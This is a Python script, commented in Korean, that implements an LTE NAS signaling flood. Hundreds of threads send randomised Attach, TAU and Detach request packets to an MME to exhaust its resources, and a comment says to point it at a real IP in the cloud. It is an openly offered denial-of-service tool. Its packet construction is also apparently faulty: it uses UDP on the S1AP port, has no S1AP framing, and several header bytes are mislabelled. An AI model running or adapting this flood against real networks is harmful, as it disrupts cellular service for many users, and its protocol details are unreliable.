#!/usr/bin/env python3
"""
LTE NAS Signaling Flood Attack
srsRAN 환경에서 NAS 시그널링 메시지를 대량으로 전송하여 MME의 리소스를 고갈시키는 공격
"""

import socket
import struct
import time
import threading
import random
import hashlib

class NASSignalingFlood:
    def __init__(self, target_ip, target_port=36412, num_ues=1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_ues = num_ues
        self.attack_threads = []
        self.running = False
        
    def generate_imsi(self):
        """임의의 IMSI 생성"""
        return random.randint(100000000000000, 999999999999999)  # IMSI는 15자리
    
    def generate_guti(self):
        """임의의 GUTI 생성"""
        return random.randint(1000000000000000000, 9999999999999999999)  # GUTI는 큰 값
    
    def create_attach_request(self, imsi):
        """Attach Request 메시지 생성"""
        nas_msg = struct.pack('>B', 0x41)  # Security header type
        nas_msg += struct.pack('>B', 0x07)  # Message type (Attach Request)
        nas_msg += struct.pack('>B', 0x00)  # EPS attach type
        nas_msg += struct.pack('>B', 0x00)  # NAS key set identifier
        nas_msg += struct.pack('>Q', imsi)  # IMSI
        return nas_msg
    
    def create_tau_request(self, guti):
        """Tracking Area Update Request 메시지 생성"""
        nas_msg = struct.pack('>B', 0x48)  # Security header type
        nas_msg += struct.pack('>B', 0x49)  # Message type (TAU Request)
        nas_msg += struct.pack('>B', 0x00)  # EPS update type
        nas_msg += struct.pack('>B', 0x00)  # NAS key set identifier
        nas_msg += struct.pack('>Q', guti)  # GUTI
        return nas_msg
    
    def create_detach_request(self, imsi):
        """Detach Request 메시지 생성"""
        nas_msg = struct.pack('>B', 0x45)  # Security header type
        nas_msg += struct.pack('>B', 0x45)  # Message type (Detach Request)
        nas_msg += struct.pack('>B', 0x00)  # Detach type
        nas_msg += struct.pack('>B', 0x00)  # NAS key set identifier
        nas_msg += struct.pack('>Q', imsi)  # IMSI
        return nas_msg
    
    def send_nas_messages(self, ue_id, duration=60):
        """NAS 시그널링 메시지 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start_time = time.time()
        
        message_types = ['attach', 'tau', 'detach']
        
        while self.running and (time.time() - start_time) < duration:
            try:
                msg_type = random.choice(message_types)
                imsi = self.generate_imsi()
                guti = self.generate_guti()
                
                if msg_type == 'attach':
                    nas_packet = self.create_attach_request(imsi)
                elif msg_type == 'tau':
                    nas_packet = self.create_tau_request(guti)
                else:  # detach
                    nas_packet = self.create_detach_request(imsi)
                
                # NAS 메시지 전송
                sock.sendto(nas_packet, (self.target_ip, self.target_port))
                
                # 랜덤 간격으로 전송
                time.sleep(random.uniform(0.2, 1.0))
                
            except Exception as e:
                print(f"UE {ue_id} NAS 전송 오류: {e}")
                break
        
        sock.close()
    
    def start_attack(self, duration=60):
        """공격 시작"""
        print(f"NAS Signaling Flood 공격 시작...")
        print(f"대상: {self.target_ip}:{self.target_port}")
        print(f"UE 수: {self.num_ues}")
        print(f"지속 시간: {duration}초")
        
        self.running = True
        
        # 각 UE에 대해 별도 스레드 생성
        for i in range(self.num_ues):
            thread = threading.Thread(
                target=self.send_nas_messages,
                args=(i, duration)
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
            time.sleep(0.01)
        
        print(f"{self.num_ues}개 UE 스레드 시작됨")
        
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print("공격 중지 중...")
        self.running = False
        
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        print("공격 완료")

def main():
    # 공격 대상 설정
    target_ip = "127.0.0.1"  # 클라우드 환경에서는 실제 IP로 변경
    target_port = 36412
    
    # 공격 파라미터
    num_ues = 300
    duration = 120
    
    attack = NASSignalingFlood(target_ip, target_port, num_ues)
    
    try:
        attack.start_attack(duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
